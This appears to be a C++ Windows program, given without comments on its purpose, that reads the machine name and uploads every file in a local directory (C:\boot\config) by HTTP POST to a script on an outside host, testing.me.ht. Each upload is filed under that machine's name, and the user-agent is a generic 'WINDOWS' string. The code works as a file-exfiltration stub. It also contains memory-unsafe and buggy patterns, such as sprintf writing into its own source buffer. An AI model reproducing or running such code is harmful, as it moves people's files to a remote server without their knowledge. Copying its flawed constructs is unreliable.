#define _CRT_SECURE_NO_DEPRECATE
#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <conio.h>
#pragma comment(lib,"wininet.lib")
#define ERROR_OPEN_FILE       10
#define ERROR_MEMORY          11
#define ERROR_SIZE            12
#define ERROR_INTERNET_OPEN   13
#define ERROR_INTERNET_CONN   14
#define ERROR_INTERNET_REQ    15
#define ERROR_INTERNET_SEND   16
#define ERROR_NO_PATH         17
#define ERROR_FINDNEXT        18

int main(void)   // returns 0 upon success
{
    // taking system name
  char sys_name[MAX_COMPUTERNAME_LENGTH + 1];  
  DWORD size = MAX_COMPUTERNAME_LENGTH + 1 ; 
  GetComputerName( sys_name, &size );
  std::string secondlevel (sys_name);
    
    static char hdrs[] = "Content-Type: multipart/form-data; boundary=---------------------------7d82751e2bc0858";
    static char boundary[] = "-----------------------------7d82751e2bc0858";            //Header boundary
    static char nameForm[] = "uploadedfile";     //Input form name
//    static char iaddr[] = "166.62.10.32";        //IP address
      static char iaddr[] = "testing.me.ht";        //IP address
    //static char url[] = "/xampp/testing/upload.php?folder=computers&&foldername="+ secondlevel";
   static char url[500] ;  ;
  // strcat(url,"/~jitender1989/testing/upload.php?folder=computers&&foldername=");
    strcat(url,"/upload.php?folder=computers&&foldername=");
   strcat(url,sys_name); 

    char *buffer;       // Buffer containing file + headers
    FILE *pFile;        // File pointer
    long lSize;         // File size
    int len, sent, retval= 0;
    char *buf_tail;
    HINTERNET hSession=0, hConnect=0, hRequest=0;
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;
    char sPath[2048];
    char sDir[]= "C:\\boot\\config";

    sprintf(sPath, "%s\\*.*", sDir);

    if ((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        printf("Path not found: [%s]\n", sDir);
        return ERROR_NO_PATH;
    }
    do
    {
            
        if ((fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)==0)
        {
            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);

            // Open file
            if ((pFile = fopen(sPath, "rb")) == NULL)
            {
                printf("ERROR_OPEN_FILE");
                return ERROR_OPEN_FILE;
            }
            // obtain file size:
            fseek(pFile, 0, SEEK_END);
            lSize = ftell(pFile);
            rewind(pFile);
           
            //allocate memory to contain the whole file + HEADER and trailer
            if ((buffer = (char *) malloc(sizeof(char)*lSize + 2048))== NULL)
            {
                printf("ERROR_MEMORY");
                fclose(pFile);
                return ERROR_MEMORY;
            }
            // create the header
            sprintf(buffer, "%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n", boundary, nameForm, fdFile.cFileName);
            sprintf(buffer, "%sContent-Length: %d\r\n", buffer, lSize);
            strcat(buffer, "\r\n");
            len= strlen(buffer);

            // read the file into the buffer:
            if (fread(buffer + len, 1, lSize, pFile) != lSize)
            {
                printf("ERROR_SIZE");
                fclose(pFile);
                retval= ERROR_SIZE;
                goto cleanup;
            }
            fclose(pFile);

            // create the trailer
            buf_tail= buffer+len+lSize;
            strcpy(buf_tail, "\r\n");
            strcat(buf_tail, boundary);
            strcat(buf_tail, "--\r\n");
            

            // Open internet connection
            if ((hSession = InternetOpen("WINDOWS", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) == NULL)
            {
                printf("ERROR_INTERNET_OPEN");
                retval= ERROR_INTERNET_OPEN;
                goto cleanup;
            }
            if ((hConnect = InternetConnect(hSession, iaddr, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1)) == NULL)
            {
                printf("ERROR_INTERNET_CONN");
                retval= ERROR_INTERNET_CONN;
                goto cleanup;
            }
            if ((hRequest = HttpOpenRequest(hConnect, (const char*)"POST", url, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 1))  == NULL)
            {
                printf("ERROR_INTERNET_REQ");
                retval= ERROR_INTERNET_REQ;
                goto cleanup;
            }
           if ((sent = HttpSendRequest(hRequest, hdrs, strlen(hdrs), buffer, len+lSize+strlen(buf_tail))) == 0)
            {
               printf("ERROR_INTERNET_SEND");
                retval= ERROR_INTERNET_SEND;
                goto cleanup;
            }
            
            
          cleanup:
            if (hSession) {InternetCloseHandle(hSession); hSession= 0;}
            if (hConnect) {InternetCloseHandle(hConnect); hConnect= 0;}
            if (hRequest) {InternetCloseHandle(hRequest); hRequest= 0;}
            free(buffer);
            if (retval!=0) {
                          
                break;  // an error occurred: break out of the while-loop
            }
        }
    } while(FindNextFile(hFind, &fdFile));

    if (GetLastError()!=ERROR_NO_MORE_FILES) {
        printf("ERROR_FINDNEXT");
        retval= ERROR_FINDNEXT;
    }
    FindClose(hFind);
    getch();
    return retval;
}